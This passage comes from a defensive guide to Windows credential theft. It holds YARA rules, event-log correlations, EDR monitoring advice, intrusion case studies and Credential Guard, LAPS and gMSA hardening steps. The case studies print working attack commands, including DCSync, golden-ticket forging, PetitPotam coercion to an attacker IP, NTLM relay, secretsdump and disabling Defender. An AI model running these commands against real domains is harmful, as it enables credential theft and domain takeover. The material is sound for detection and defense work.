        // PE section names specific to Mimikatz
        $pe1 = ".kiwi" ascii
        $pe2 = "kiwidrv" ascii

    condition:
        uint16(0) == 0x5A4D and
        (
            3 of ($s*) or
            2 of ($f*) or
            any of ($pe*) or
            (2 of ($s*) and 1 of ($f*))
        )
}
```

#### 17.2.2 LSASS Memory Dump File

```yara
rule LSASS_Memory_Dump_File
{
    meta:
        description = "Detects LSASS process memory dump files (MiniDump format) containing credential material"
        author = "SOC Detection Engineering"
        date = "2025-03-15"
        reference = "https://attack.mitre.org/techniques/T1003/001/"
        severity = "critical"

    strings:
        // MiniDump header signature
        $mdmp = { 4D 44 4D 50 }  // "MDMP" magic bytes

        // LSASS-specific strings found in memory dumps
        $lsass1 = "lsass.exe" ascii wide
        $lsass2 = "lsasrv.dll" ascii wide
        $lsass3 = "msv1_0.dll" ascii wide
        $lsass4 = "wdigest.dll" ascii wide
        $lsass5 = "kerberos.dll" ascii wide
        $lsass6 = "tspkg.dll" ascii wide
        $lsass7 = "lsaiso.exe" ascii wide

        // SSP internal structures
        $ssp1 = "Primary" ascii wide
        $ssp2 = "NTLM" ascii wide
        $ssp3 = "WDigest" ascii wide
        $ssp4 = "Kerberos" ascii wide

        // NanoDump invalid signature (intentionally corrupted header)
        $nano_corrupt = { 00 00 00 00 93 A7 }  // zeroed MDMP + stream count

    condition:
        (
            $mdmp at 0 and 3 of ($lsass*) and 2 of ($ssp*)
        )
        or
        (
            // NanoDump-style corrupted header with LSASS content
            $nano_corrupt at 0 and 3 of ($lsass*)
        )
        or
        (
            // Large file with LSASS SSP strings (generic dump detection)
            filesize > 10MB and 4 of ($lsass*) and 3 of ($ssp*)
        )
}
```

#### 17.2.3 SAM Hive Dump Artifacts

```yara
rule SAM_Hive_Dump_Artifact
{
    meta:
        description = "Detects SAM registry hive files saved to disk outside the normal System32\\config location"
        author = "SOC Detection Engineering"
        date = "2025-03-15"
        reference = "https://attack.mitre.org/techniques/T1003/002/"
        severity = "high"

    strings:
        // Registry hive header signature
        $regf = { 72 65 67 66 }  // "regf" magic

        // SAM-specific key paths
        $sam1 = "SAM\\Domains\\Account\\Users" ascii wide
        $sam2 = "SAM\\Domains\\Account\\F" ascii wide
        $sam3 = "SAM\\Domains\\Builtin" ascii wide

        // SYSTEM hive markers (needed alongside SAM for decryption)
        $sys1 = "ControlSet001\\Control\\Lsa" ascii wide
        $sys2 = "JD" ascii wide
        $sys3 = "Skew1" ascii wide
        $sys4 = "GBG" ascii wide

        // SECURITY hive markers
        $sec1 = "Policy\\Secrets" ascii wide
        $sec2 = "Policy\\PolEKList" ascii wide
        $sec3 = "CurrVal" ascii wide

    condition:
        $regf at 0 and
        (
            2 of ($sam*) or
            (2 of ($sys*) and ($sys1)) or
            2 of ($sec*)
        )
}
```

#### 17.2.4 Credential Harvesting Tool Artifacts

```yara
rule Credential_Harvesting_Tools
{
    meta:
        description = "Detects binaries and artifacts from credential harvesting tools: LaZagne, SharpDPAPI, Rubeus, SharpChromium"
        author = "SOC Detection Engineering"
        date = "2025-03-15"
        reference = "https://attack.mitre.org/techniques/T1555/"
        severity = "high"

    strings:
        // LaZagne signatures
        $laz1 = "lazagne" ascii wide nocase
        $laz2 = "AlessandroZ" ascii wide
        $laz3 = "softwares.browsers" ascii
        $laz4 = "softwares.sysadmin" ascii
        $laz5 = "softwares.wifi" ascii

        // SharpDPAPI signatures
        $sdp1 = "SharpDPAPI" ascii wide
        $sdp2 = "masterkeys" ascii
        $sdp3 = "CalculateKeys" ascii
        $sdp4 = "DPAPI_SYSTEM" ascii

        // Rubeus signatures
        $rub1 = "Rubeus" ascii wide
        $rub2 = "kerberoast" ascii wide nocase
        $rub3 = "asreproast" ascii wide nocase
        $rub4 = "s4u" ascii wide nocase
        $rub5 = "tgtdeleg" ascii wide nocase
        $rub6 = "GhostPack" ascii wide

        // SharpChromium signatures
        $sc1 = "SharpChromium" ascii wide
        $sc2 = "logins" ascii
        $sc3 = "Login Data" ascii wide
        $sc4 = "ChromiumCredentialManager" ascii

    condition:
        uint16(0) == 0x5A4D and
        (
            3 of ($laz*) or
            3 of ($sdp*) or
            3 of ($rub*) or
            3 of ($sc*)
        )
}
```

### 17.3 Windows Event Log Correlation Patterns

The following correlation patterns combine multiple Event IDs to detect credential attack chains that individual event monitoring misses.

**Kerberoasting chain (Event ID 4769 + 4770):**

| Step | Event ID | Key Fields | Threshold |
|------|----------|------------|-----------|
| 1 — TGS Request | 4769 | `EncryptionType: 0x17`, `ServiceName` not ending in `$`, `Status: 0x0` | > 3 unique SPNs per source IP in 5 min |
| 2 — Service ticket renewal | 4770 | Same `ServiceName` and source — absence of 4770 after 4769 indicates offline cracking | Correlate with step 1 |

**Password spraying chain (Event ID 4625 + 4624 + 4648):**

| Step | Event ID | Key Fields | Threshold |
|------|----------|------------|-----------|
| 1 — Failed logon burst | 4625 | `Status: 0xC000006A` (bad password), `SubStatus` | > 10 distinct `TargetUserName` per `IpAddress` in 10 min |
| 2 — Successful logon | 4624 | Same `IpAddress`, `LogonType: 3 or 10` | Within 30 min of step 1 |
| 3 — Explicit credential use | 4648 | `SubjectUserName` from step 2 using `TargetServerName` | Lateral movement indicator |

**DCSync chain (Event ID 4662 + 4624):**

| Step | Event ID | Key Fields | Threshold |
|------|----------|------------|-----------|
| 1 — Replication access | 4662 | `Properties` contains `1131f6ad` or `1131f6aa`, `SubjectUserName` not a DC machine account | Any occurrence |
| 2 — Preceding logon | 4624 | Same `SubjectUserName`, `LogonType: 3` (network) | Within 60 min before step 1 |
| 3 — Validate source | — | Source IP is not a known DC IP | Cross-reference with CMDB |

**Golden Ticket / Pass-the-Ticket detection (Event ID 4768 + 4769 + 4624):**

| Indicator | Detection Logic |
|-----------|----------------|
| TGT with anomalous lifetime | Event ID 4768 where ticket lifetime exceeds domain policy (default 10h) |
| TGT without AS-REQ | Event ID 4624 Type 3 with Kerberos auth but no corresponding 4768 on the DC |
| Forged PAC | Event ID 4627 (group membership) showing SIDs not matching AD group membership |
| Encryption downgrade | Event ID 4768/4769 using RC4 when account has AES keys |

### 17.4 EDR Telemetry and Kernel-Level Monitoring

**LSASS handle open monitoring:**

EDR agents intercept `NtOpenProcess` calls targeting `lsass.exe` by hooking the SSDT or using kernel callbacks (`ObRegisterCallbacks` with `OB_OPERATION_HANDLE_CREATE`). Key telemetry points:

| Telemetry Source | What It Captures | Evasion It Detects |
|------------------|------------------|--------------------|
| `ObRegisterCallbacks` (kernel) | Handle creation to LSASS with access mask | Direct `NtOpenProcess` calls even via syscall stubs |
| `PsSetCreateProcessNotifyRoutineEx` | Process creation with LSASS as parent/target | Fork-and-dump (NanoDump `--fork`) |
| `Microsoft-Windows-Threat-Intelligence` ETW | Kernel-level read operations against protected processes | Direct syscall invocations bypassing user-mode hooks |
| Minifilter driver (`FltRegisterFilter`) | File writes matching dump signatures | On-disk dump creation (comsvcs.dll, procdump) |
| `CmRegisterCallbackEx` | Registry modifications to LSA/WDigest keys | WDigest re-enablement, RunAsPPL disablement |

**Credential Guard detection via ETW:**

```powershell
# Verify Credential Guard is active
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard |
  Select-Object SecurityServicesRunning, VirtualizationBasedSecurityStatus

# ETW provider for Credential Guard events
logman create trace "CredGuardTrace" -p {D0E4BC17-34C7-43FC-9A72-D89A59D6979A} -o credguard.etl -ets

# Monitor for Credential Guard bypass attempts
# Event ID 325: VBS integrity failure
# Event ID 326: Credential Guard policy violation
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-DeviceGuard/Operational'; Id=325,326}
```

**Minifilter-based credential file monitoring:**

Deploy a filesystem minifilter (or configure EDR file monitoring rules) to alert on access to:

```
%SystemRoot%\System32\config\SAM
%SystemRoot%\System32\config\SYSTEM
%SystemRoot%\System32\config\SECURITY
%SystemRoot%\NTDS\ntds.dit
%APPDATA%\Microsoft\Protect\*\*           # DPAPI master keys
%LOCALAPPDATA%\Google\Chrome\User Data\*\Login Data
%LOCALAPPDATA%\Microsoft\Edge\User Data\*\Login Data
%APPDATA%\Microsoft\Credentials\*
%LOCALAPPDATA%\.IdentityService\msal.cache   # Azure token cache
```

Any process other than `lsass.exe`, `svchost.exe` (hosting CryptSvc), or the owning browser accessing these paths should generate a high-severity alert.

---

## 18. Credential Attack Chain Case Studies

Real-world intrusions demonstrate how credential theft techniques chain together. Each case study traces the full attack path from initial access through credential compromise to objective completion, documenting detection failures and operational lessons.

### 18.1 SolarWinds / SUNBURST — Golden SAML Forging Chain

**Campaign:** UNC2452 (APT29/Cozy Bear), discovered December 2020. Supply-chain compromise of SolarWinds Orion IT monitoring platform (CVE-2020-10148 — authentication bypass in Orion API).

**Credential attack chain:**

1. **Initial access:** Trojanized SolarWinds Orion update (`SolarWinds.Orion.Core.BusinessLayer.dll`) deployed to ~18,000 organizations. The SUNBURST backdoor established C2 via DNS beaconing to `avsvmcloud.com`.

2. **Privilege escalation:** From the Orion service account (typically high-privileged for monitoring), the attackers used token impersonation to acquire domain admin or equivalent privileges. On systems where Orion ran as a domain admin, no escalation was necessary.

3. **AD FS compromise:** The attackers targeted AD FS servers to extract the SAML token-signing certificate. The method involved:
   ```
   # Step 1: DCSync the AD FS service account
   mimikatz # lsadump::dcsync /domain:victim.com /user:ADFS_SVC$
   
   # Step 2: Extract DKM (Distributed Key Manager) key from AD
   # The DKM key is stored in an AD container:
   # CN=CryptoPolicy,CN=ADFS,CN=Microsoft,CN=Program Data,DC=victim,DC=com
   # The private key attribute: thumbnailPhoto or msDS-KeyCredentialLink
   
   # Step 3: Decrypt the token-signing certificate using DKM key
   ADFSDump.exe /domain:victim.com
   
   # Step 4: Forge SAML assertions for any user to any relying party
   python3 ADFSpoof.py -b adfs_config.bin dkm_key \
     -s "http://victim.com/adfs/services/trust" \
     --nameid admin@victim.com --rpidentifier "urn:federation:MicrosoftOnline"
   ```

4. **Cloud pivot:** Forged SAML tokens granted access to Microsoft 365 mailboxes, Azure subscriptions, and federated SaaS applications without triggering MFA (the SAML assertion was already post-authentication from the IdP's perspective).

5. **Persistence:** The attackers added new federation trusts, created OAuth application registrations with mail read permissions, and added credentials to existing service principals — ensuring access survived AD FS certificate rotation.

**Detection failures:**
- SAML token validation did not flag tokens with anomalous claims or issuance timestamps outside business hours
- No monitoring of AD FS DKM key access in Active Directory
- Forged tokens matched legitimate token lifetimes and claims, evading anomaly detection
- Azure AD sign-in logs showed valid federation, indistinguishable from legitimate SSO

**Lessons learned:**
- Monitor AD FS DKM container access (Event ID 4662 targeting the DKM object)
- Rotate AD FS signing certificates and deploy certificate change alerts
- Implement Azure AD CAE and token lifetime policies (1-hour maximum for sensitive workloads)
- Deploy Microsoft Sentinel Golden SAML detection workbook (correlates Entra ID sign-in anomalies with AD FS configuration changes)

### 18.2 Scattered Spider — MFA Fatigue + Helpdesk Social Engineering

**Threat actor:** UNC3944 / Octo Tempest / Scattered Spider. Active since 2022, targeting technology, telecommunications, and financial organizations.

**Credential attack chain:**

1. **Initial access:** Social engineering of IT helpdesk personnel. Attackers impersonated employees, provided employee IDs and personal information (obtained from data broker databases and LinkedIn), and requested password resets or MFA device enrollment changes. In several incidents, attackers called the helpdesk while simultaneously sending the legitimate employee's manager a spoofed message to "confirm" the request.

2. **MFA bypass (fatigue/push bombing):** For targets where helpdesk social engineering was insufficient, attackers used valid credentials (obtained through phishing or purchased from initial access brokers) and triggered repeated Okta Verify push notifications until the victim approved:
   ```
   # Attack pattern observed in Okta logs:
   # 20+ push_mfa_challenge events in < 5 minutes for same user
   # Followed by: push_mfa_challenge_approved
   # Source IP: residential proxy (no VPN/datacenter fingerprint)
   ```

3. **Okta admin compromise:** Once authenticated, attackers targeted Okta administrator accounts. They exploited Okta's admin console to:
   - Reset MFA for other high-value accounts
   - Create new Okta admin accounts
   - Modify authentication policies to bypass MFA for attacker-controlled sessions
   - Add IdP configurations for attacker-controlled identity providers

4. **Cloud credential pivot:** From Okta admin access, the attackers:
   - Accessed federated AWS accounts via SAML assertions
   - Extracted API keys and secrets from cloud configuration stores (AWS Secrets Manager, Parameter Store)
   - Pivoted to CI/CD pipelines (GitHub Actions, CircleCI) where long-lived cloud credentials were stored as environment variables
   - Exfiltrated source code repositories containing hardcoded credentials

5. **Data exfiltration and extortion:** Leveraged stolen cloud credentials to access customer data, deployed ransomware selectively, and demanded payment for non-disclosure.

**Detection failures:**
- Helpdesk lacked verification procedures beyond knowledge-based questions
- MFA fatigue detection relied on thresholds that were too high (>50 pushes)
- Okta admin actions were logged but not monitored in real-time
- No alerting on Okta admin account creation or MFA policy changes

**Lessons learned:**
- Implement callback verification for all password reset and MFA change requests
- Deploy Okta number matching and phishing-resistant MFA (FIDO2/WebAuthn)
- Monitor Okta System Log for `user.mfa.factor.deactivate`, `user.mfa.factor.activate`, `policy.lifecycle.update` events
- Alert on Okta admin role assignments (`user.account.privilege.grant`)
- Enforce MFA push rate limiting (max 3 pushes per 10-minute window)

### 18.3 APT29 / Cozy Bear — NTLM Relay to DCSync to Golden Ticket

**Campaign:** Multiple APT29 operations (2018-2023) targeting government, diplomatic, and research organizations. This composite chain reflects techniques documented across multiple APT29 intrusions.

**Credential attack chain:**

1. **Initial access:** Spearphishing with ISO/LNK payloads or HTML smuggling delivering BEATDROP/ROOTSAW loaders. In later operations, exploitation of internet-facing appliances (e.g., CVE-2023-42793 — JetBrains TeamCity authentication bypass).

2. **NTLM coercion and relay:**
   ```
   # PetitPotam coercion — force DC to authenticate to attacker
   python3 PetitPotam.py -d victim.com -u lowpriv -p Password1 \
     attacker_ip dc01.victim.com
   
   # ntlmrelayx — relay coerced DC authentication to LDAP on another DC
   impacket-ntlmrelayx -t ldap://dc02.victim.com --escalate-user lowpriv \
     --delegate-access
   
   # Result: lowpriv account gains DCSync rights via RBCD or ACL modification
   ```

3. **DCSync execution:**
   ```
   # Extract krbtgt hash for Golden Ticket
   impacket-secretsdump victim.com/lowpriv:Password1@dc02.victim.com -just-dc-user krbtgt
   
   # Extract AZUREADSSOACC$ for Silver Ticket against Azure AD SSO
   impacket-secretsdump victim.com/lowpriv:Password1@dc02.victim.com \
     -just-dc-user 'AZUREADSSOACC$'
   ```

4. **Golden Ticket forging:**
   ```
   # Forge Golden Ticket with krbtgt hash
   mimikatz # kerberos::golden /user:Administrator /domain:victim.com \
     /sid:S-1-5-21-... /krbtgt:<NT_HASH> /ptt
   
   # Or with Impacket
   impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid S-1-5-21-... \
     -domain victim.com Administrator
   export KRB5CCNAME=Administrator.ccache
   
   # Access any resource as any user
   impacket-psexec victim.com/Administrator@dc01.victim.com -k -no-pass
   impacket-secretsdump victim.com/Administrator@dc01.victim.com -k -no-pass
   ```

5. **Persistence and lateral movement:** Golden Tickets provided persistent domain access surviving password changes (until krbtgt was rotated twice). The attackers deployed additional persistence through scheduled tasks, WMI event subscriptions, and ADCS certificate enrollment for long-lived machine certificates.

**Detection failures:**
- PetitPotam coercion traffic (EFS RPC calls) was not monitored
- DCSync rights modification via LDAP relay was not detected because ACL auditing was not enabled on the domain root
- Golden Ticket usage was invisible because the TGT was never presented to the DC for validation — it was self-issued
- The krbtgt account password had not been changed in over 3 years

**Lessons learned:**
- Disable NTLM where possible; enforce EPA (Extended Protection for Authentication) on LDAP
- Enable SACL auditing on domain root for `DS-Replication-Get-Changes-All` permission modifications
- Rotate krbtgt password twice (to invalidate both current and previous keys) semi-annually
- Deploy network monitoring for EFS RPC, MS-RPRN, MS-DFSNM coercion protocols
- Monitor for TGTs with anomalous lifetimes or SID history via Event ID 4769 with PAC validation

### 18.4 Kaseya / REvil — MSP Credential Harvesting to Domain-Wide Ransomware

**Campaign:** REvil/Sodinokibi ransomware group, July 2021. Exploitation of Kaseya VSA (CVE-2021-30116 — authentication bypass, CVE-2021-30119 — credential leak in user portal, CVE-2021-30120 — 2FA bypass).

**Credential attack chain:**

1. **Initial access:** Zero-day exploitation of Kaseya VSA on-premises servers. The authentication bypass (CVE-2021-30116) allowed unauthenticated access to the VSA agent deployment functionality. The attackers leveraged CVE-2021-30120 to bypass MFA on the VSA admin panel.

2. **Agent abuse for credential access:** Kaseya VSA agents run as SYSTEM on managed endpoints. The attackers used the legitimate VSA agent procedure execution to:
   ```
   # Disable Windows Defender via VSA procedure
   Set-MpPreference -DisableRealtimeMonitoring $true
   
   # Drop ransomware payload via VSA agent update mechanism
   # The payload was signed with a Windows Authenticode certificate
   # and deployed as a "Kaseya VSA Agent Hot-fix"
   
   # Credential harvesting from managed endpoints
   # VSA stored service account credentials for each managed organization
   # Attackers extracted these from the VSA database
   ```

3. **Domain credential harvesting:** On MSP networks, the attackers:
   - Extracted cached domain credentials from the VSA database (stored for managed customer environments)
   - Used the VSA SYSTEM-level agent to dump LSASS on customer domain controllers
   - Leveraged per-customer domain admin credentials stored in the MSP's credential vault (accessible via the compromised VSA)

4. **Ransomware deployment:** Using harvested domain credentials, the attackers:
   - Disabled security software via GPO
   - Deployed REvil ransomware to all domain-joined endpoints via the VSA agent push mechanism
   - Encrypted approximately 1,500 downstream organizations through approximately 60 compromised MSPs

**Detection failures:**
- VSA agent procedures ran as SYSTEM — indistinguishable from legitimate management actions
- The ransomware payload was signed with a valid Authenticode certificate
- MSP customers had no visibility into the MSP's VSA server compromise
- LSASS dumping by the VSA agent matched the agent's normal behavior profile

**Lessons learned:**
- MSP management tools must be treated as Tier 0 assets with credential isolation
- Implement jump servers between MSP management planes and customer environments
- Deploy canary credentials (honeytokens) that trigger alerts when used
- Restrict VSA agent capabilities: disable arbitrary script execution, enforce procedure allowlisting
- Monitor for Authenticode-signed binaries executing from temporary directories
- Deploy EDR that monitors LSASS access regardless of the source process privilege level

---

## 19. Advanced Credential Hardening

This section provides deployment-grade configurations for credential protection controls, going beyond the summary in §15 with exact GPO paths, compatibility matrices, deployment sequencing, and validation procedures.

### 19.1 Credential Guard and LSA Protection Deployment

**Credential Guard prerequisites:**

| Requirement | Detail |
|-------------|--------|
| Hardware | UEFI firmware with Secure Boot, VT-x/AMD-V, SLAT (EPT/RVI) |
| OS | Windows 10/11 Enterprise/Education, Server 2016+ |
| Firmware | UEFI 2.3.1 or higher with UEFI Secure Boot enabled |
| TPM | Recommended (TPM 2.0 for UEFI lock) |
| Incompatible | Older WiFi drivers, some VPN clients, applications using NTLMv1 |

**GPO deployment (recommended):**

```
Computer Configuration → Policies → Administrative Templates →
  System → Device Guard → Turn on Virtualization Based Security

  Select Platform Security Level: Secure Boot and DMA Protection
  Virtualization Based Protection of Code Integrity: Enabled with UEFI lock
  Credential Guard Configuration: Enabled with UEFI lock
  Secure Launch Configuration: Enabled
```

**Registry deployment (scripted/MDM):**

```powershell
# Enable VBS + Credential Guard with UEFI lock
reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v EnableVirtualizationBasedSecurity /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v RequirePlatformSecurityFeatures /t REG_DWORD /d 3 /f
# 1 = Secure Boot, 3 = Secure Boot + DMA Protection

reg add "HKLM\SYSTEM\CurrentControlSet\Control\LSA" /v LsaCfgFlags /t REG_DWORD /d 1 /f
# 1 = Enabled with UEFI lock (cannot be disabled remotely)
# 2 = Enabled without UEFI lock (can be disabled via registry)

# Enable LSA as Protected Process Light (defense-in-depth with Credential Guard)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 2 /f
# 2 = UEFI-locked PPL (recommended), 1 = registry-only PPL

# Reboot required
Restart-Computer -Force
```

**Validation:**

```powershell
# Verify Credential Guard status
$dg = Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
$dg.SecurityServicesRunning     # Should contain 1 (Credential Guard)
$dg.VirtualizationBasedSecurityStatus  # 2 = Running
$dg.SecurityServicesConfigured  # Should contain 1

# Verify via System Information
msinfo32  # "Credential Guard" should show "Running" under Virtualization-based Security

# Verify LSA PPL
(Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa").RunAsPPL  # Should be 2

# Test: attempt Mimikatz — should fail
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
# Expected: "ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)"
```

### 19.2 Protected Users Security Group

The Protected Users group applies a set of non-configurable protections to member accounts. It is one of the most impactful single controls for credential theft mitigation.

**What Protected Users blocks:**

| Protection | Effect |
|------------|--------|
| No NTLM authentication | Members cannot authenticate via NTLM — only Kerberos |
| No WDigest credential caching | Plaintext passwords never cached in LSASS, even if UseLogonCredential=1 |
| No DES or RC4 in Kerberos | Only AES256-CTS-HMAC-SHA1-96 for TGT and service tickets |
| No credential delegation | CredSSP and WDigest delegation disabled |
| No renewable TGTs | TGT cannot be renewed — forces re-authentication at TGT expiry |
| 4-hour TGT lifetime | Maximum TGT lifetime reduced to 4 hours (not configurable) |
| No caching of credentials | Offline logon cache (DCC2) not populated for the member |

**Compatibility issues:**

| Scenario | Impact | Mitigation |
|----------|--------|------------|
| NTLM-only applications | Authentication fails | Migrate application to Kerberos or exclude account from Protected Users |
| RDP with NLA using CredSSP | May fail depending on configuration | Use Remote Credential Guard instead |
| Scheduled tasks with stored creds | Task fails after TGT expires | Use gMSA for scheduled tasks |
| Network shares via IP | Fails (Kerberos requires hostnames, not IPs) | Use FQDN for all resource access |
| Offline domain join | Cached credentials unavailable | Perform joins while connected |
| Legacy DCs (2008 R2 or older) | Protection not enforced by older DCs | Ensure all DCs are 2012 R2+ |

**Deployment guide:**

```powershell
# Step 1: Audit current NTLM usage for candidate accounts
# Enable NTLM audit logging on all DCs
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0" `
  -Name "AuditReceivingNTLMTraffic" -Value 2

# Review NTLM usage in Event Log 8004 (NTLM authentication to this DC)
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-NTLM/Operational'; Id=8004} |
  Select-Object -Property TimeCreated, @{n='User';e={$_.Properties[0].Value}},
  @{n='Domain';e={$_.Properties[1].Value}}, @{n='Workstation';e={$_.Properties[2].Value}}

# Step 2: Add accounts incrementally (start with Tier 0)
Add-ADGroupMember -Identity "Protected Users" -Members @(
  "Domain Admins",
  "Enterprise Admins",
  "Schema Admins",
  "T0-Admin-Accounts"
)

# Step 3: Monitor for authentication failures
# Event ID 4625 with Status 0xC000006E or SubStatus 0xC0000064
# from Protected Users members indicates NTLM-dependent applications

# Step 4: Validate protections are applied
Get-ADUser -Identity "admin_account" -Properties MemberOf |
  Where-Object { $_.MemberOf -match "Protected Users" }

# Verify on a DC
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4768} |
  Where-Object { $_.Properties[8].Value -match 'AES' }  # Should show AES for Protected Users
```

### 19.3 Tiered Administration Model

The tiered model (also called the Enterprise Access Model) isolates credentials so that compromise of a lower tier does not grant access to higher tiers.

**Tier definitions:**

| Tier | Assets | Credential Scope | Example Accounts |
|------|--------|-------------------|------------------|
| Tier 0 (Control Plane) | Domain Controllers, AD FS, PKI, Entra Connect, SIEM | Can only logon to Tier 0 | `t0-admin`, `t0-dc-admin` |
| Tier 1 (Management Plane) | Member servers, applications, databases, hypervisors | Can logon to Tier 1 and below | `t1-server-admin`, `t1-sql-admin` |
| Tier 2 (User Plane) | Workstations, user devices, help desk | Can only logon to Tier 2 | `t2-helpdesk`, standard users |

**GPO enforcement — restrict logon by tier:**

```powershell
# Tier 0 — Allow logon only to Tier 0 assets
# GPO: T0-Credential-Isolation (linked to DC OU)
# Computer Configuration → Policies → Windows Settings → Security Settings →
#   Local Policies → User Rights Assignment
#   "Allow log on locally" = T0-Admin-Group, Domain Admins
#   "Allow log on through Remote Desktop" = T0-Admin-Group
#   "Deny log on locally" = T1-Admin-Group, T2-Admin-Group
#   "Deny log on through Remote Desktop" = T1-Admin-Group, T2-Admin-Group

# Authentication Policies and Silos (Server 2012 R2+)
New-ADAuthenticationPolicy -Name "T0-Restricted" `
  -UserTGTLifetimeMins 60 `
  -UserAllowedToAuthenticateFrom "O:SYG:SYD:(XA;OICI;CR;;;WD;(@USER.ad://ext/AuthenticationSilo == `"T0-Silo`"))" `
  -Enforce

New-ADAuthenticationPolicySilo -Name "T0-Silo" `
  -UserAuthenticationPolicy "T0-Restricted" `
  -ComputerAuthenticationPolicy "T0-Restricted" `
  -ServiceAuthenticationPolicy "T0-Restricted" `
  -Enforce

# Assign accounts to silo
Set-ADAccountAuthenticationPolicySilo -Identity "t0-admin" -AuthenticationPolicySilo "T0-Silo"
Grant-ADAuthenticationPolicySiloAccess -Identity "T0-Silo" -Account "t0-admin"
```

**Privileged Access Workstations (PAWs):**

Tier 0 administration must occur from dedicated PAWs that are domain-joined only to the Tier 0 management forest (or using hardened standalone configurations). PAWs must have:
- Credential Guard enabled
- No internet access (air-gapped or highly restricted proxy)
- No email client or browser (except for Tier 0 management consoles)
- Device health attestation via Intune or SCCM
- Dedicated administrative accounts that never authenticate from standard workstations

### 19.4 gMSA and LAPS Deployment

**Group Managed Service Accounts (gMSA):**

gMSAs eliminate the credential management problem for service accounts entirely. The domain controller generates and rotates a 240-character random password automatically; no human ever knows or manages the password.

```powershell
# Prerequisites: KDS root key (one-time, domain-wide)
# In production, remove -EffectiveTime to wait 10 hours for replication
Add-KdsRootKey -EffectiveImmediately  # LAB ONLY
Add-KdsRootKey -EffectiveTime ((Get-Date).AddHours(-10))  # Production

# Create gMSA
New-ADServiceAccount -Name "gmsa-SQLService" `
  -DNSHostName "gmsa-sqlservice.domain.local" `
  -PrincipalsAllowedToRetrieveManagedPassword "SQL-Servers-Group" `
  -KerberosEncryptionType AES128,AES256 `
  -ServicePrincipalNames "MSSQLSvc/sql01.domain.local:1433","MSSQLSvc/sql01.domain.local"

# Install on target server
Install-ADServiceAccount -Identity "gmsa-SQLService"
Test-ADServiceAccount -Identity "gmsa-SQLService"  # Should return True

# Configure service to use gMSA
# Service account: DOMAIN\gmsa-SQLService$  (note trailing $)
# Password: leave BLANK (the system retrieves it automatically)
sc.exe config MSSQLSERVER obj= "DOMAIN\gmsa-SQLService$" password= ""
```

**Windows LAPS (Local Administrator Password Solution):**

Windows LAPS (built-in from Windows 11 22H2 / Server 2022 with April 2023 update) manages unique local admin passwords per device, storing them encrypted in Active Directory.

```powershell
# Step 1: Update AD schema for Windows LAPS
Update-LapsADSchema

# Step 2: Grant machines permission to update their own password
Set-LapsADComputerSelfPermission -Identity "OU=Workstations,DC=domain,DC=local"

# Step 3: Grant read permissions to authorized administrators
Set-LapsADReadPasswordPermission -Identity "OU=Workstations,DC=domain,DC=local" `
  -AllowedPrincipals "T1-Helpdesk-Group"

# Step 4: Configure via GPO
# Computer Configuration → Policies → Administrative Templates →
#   System → LAPS
#   "Configure password backup directory" = Active Directory
#   "Password Settings" = Complexity: Large+Small+Numbers+Specials, Length: 20, Age: 30 days
#   "Configure authorized password decryptors" = T1-Helpdesk-Group
#   "Enable password encryption" = Enabled (requires 2016+ DFL)

# Step 5: Retrieve password
Get-LapsADPassword -Identity "WORKSTATION01" -AsPlainText

# Step 6: Monitor for LAPS bypass
# Event ID 4662 targeting ms-Mcs-AdmPwd or msLAPS-Password attributes
# from accounts not in the authorized reader group
```

### 19.5 Certificate-Based Authentication

Replacing passwords with certificates eliminates most credential theft vectors. Windows Hello for Business (WHfB) and smart card authentication bind credentials to hardware, making remote credential theft impossible.

**Windows Hello for Business — Hybrid Key Trust deployment:**

```powershell
# Prerequisites:
# - Azure AD Connect syncing device objects
# - AD FS 2016+ or Azure AD Kerberos (cloud trust, simpler)
# - Windows 10/11 clients joined to Azure AD or Hybrid Azure AD

# GPO: Enable WHfB
# Computer Configuration → Policies → Administrative Templates →
#   Windows Components → Windows Hello for Business
#   "Use Windows Hello for Business" = Enabled
#   "Use a hardware security device" = Enabled (requires TPM)
#   "Use certificate for on-premises authentication" = Enabled (cert trust)
#     or leave disabled (key trust — simpler, recommended for new deployments)

# Cloud Kerberos Trust (recommended, simplest deployment):
# Requires: Windows Server 2016+ DCs, Azure AD Kerberos object
# No AD FS required, no certificate infrastructure needed for key trust

# Create the Azure AD Kerberos server object in AD
Install-Module -Name AzureADHybridAuthenticationManagement
$cred = Get-Credential  # Domain Admin
Set-AzureADKerberosServer -Domain "domain.local" -CloudCredential $cloudCred `
  -DomainCredential $cred -UserPrincipalName "admin@domain.local"

# Verify
Get-AzureADKerberosServer -Domain "domain.local" -CloudCredential $cloudCred `
  -DomainCredential $cred
```

**What WHfB/smart card authentication blocks:**

| Attack | Blocked? | Reason |
|--------|----------|--------|
| Password spraying | Yes | No password to spray |
| Phishing (credential theft) | Yes | Private key never leaves TPM |
| AiTM phishing | Yes (FIDO2) | Origin binding prevents proxy relay |
| Pass-the-hash | Partially | NT hash still exists for backward compat; mitigate with Protected Users |
| Kerberoasting | No | Targets service accounts, not user auth method |
| Golden Ticket | No | Targets krbtgt, independent of user auth method |

### 19.6 Token Binding and Continuous Access Evaluation

**Continuous Access Evaluation (CAE):**

CAE enables near-real-time token revocation in Azure AD / Entra ID, replacing the default 1-hour token lifetime with event-driven evaluation. When a critical event occurs (password change, account disable, network location change, admin revocation), the resource provider rejects the token immediately rather than waiting for expiry.

```powershell
# CAE is enabled by default in Entra ID for supported workloads
# Verify CAE status in Conditional Access
# Entra Admin Center → Protection → Conditional Access → Session
# "Customize continuous access evaluation" = Enabled (default)

# Supported first-party apps (as of 2025):
# Exchange Online, SharePoint Online, Teams, Microsoft Graph
# CAE-capable tokens have a 24-hour lifetime but are revocable in <1 minute

# Force strict location enforcement with CAE
